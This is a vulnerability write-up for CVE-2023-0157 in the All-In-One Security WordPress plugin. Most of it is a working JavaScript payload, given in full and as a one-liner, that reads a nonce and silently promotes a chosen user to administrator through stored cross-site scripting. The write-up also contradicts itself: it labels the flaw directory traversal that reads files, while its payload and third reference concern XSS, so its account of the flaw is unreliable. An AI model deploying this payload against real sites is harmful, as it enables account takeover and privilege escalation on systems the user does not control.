**CVE ID**: CVE-2023-0157

**Vulnerability Type**: Directory Traversal

**Description**: The All-In-One Security (AIOS) plugin for WordPress is vulnerable to directory traversal in versions up to, and including, 5.1.4. This allows authenticated attackers with administrator-level permissions to read the contents of arbitrary files on the server.

**Steps to reproduce**: 
```
Just create a test.pdf file with JavaScript content (necessarily in one line) and display the file in the Host system logs.

An example of a JavaScript payload increasing the privileges of a user with ID 5

<script>
fetch("https://<host>/wp-admin/users.php?update=promote")
    .then(function(response) {
        return response.text()
    })
    .then(function(html) {
        var parser = new DOMParser();
        var doc = parser.parseFromString(html, "text/html");

        return doc.querySelector("#_wpnonce").value;
    })
    .then(function(nonce) {
        fetch("https://<host>/wp-admin/users.php?s=&_wpnonce=" + nonce + "&_wp_http_referer=%2Fwp-admin%2Fusers.php&action=-1&new_role=administrator&changeit=Zmie%C5%84&paged=1&users%5B%5D=5&action2=-1&new_role2=administrator")
        .then(function(response) {
        console.log(response.text());
        })
        .catch(function(err) {  
        console.log('Failed to fetch page: ', err);  
        });
    })
    .catch(function(err) {  
        console.log('Failed to fetch page: ', err);  
});
</script>



Oneliner:

fetch("https://<host>/wp-admin/users.php?update=promote").then(function(response) {return response.text()}).then(function(html) {var parser = new DOMParser();var doc = parser.parseFromString(html, "text/html");return doc.querySelector("#_wpnonce").value;}).then(function(nonce) {fetch("https://<host>/wp-admin/users.php?s=&_wpnonce=" + nonce + "&_wp_http_referer=%2Fwp-admin%2Fusers.php&action=-1&new_role=administrator&changeit=Zmie%C5%84&paged=1&users%5B%5D=5&action2=-1&new_role2=administrator").then(function(response) {console.log(response.text());}).catch(function(err) {console.log('Failed to fetch page: ', err);  });}).catch(function(err) {console.log('Failed to fetch page: ', err);});

Replace values with <> signs. 
```


**Reference**: 
1. https://wpscan.com/vulnerability/8248b550-6485-4108-a701-8446ffa35f06
2. https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-0157
3. https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/all-in-one-wp-security-and-firewall/all-in-one-security-aios-514-authenticated-admin-stored-cross-site-scripting
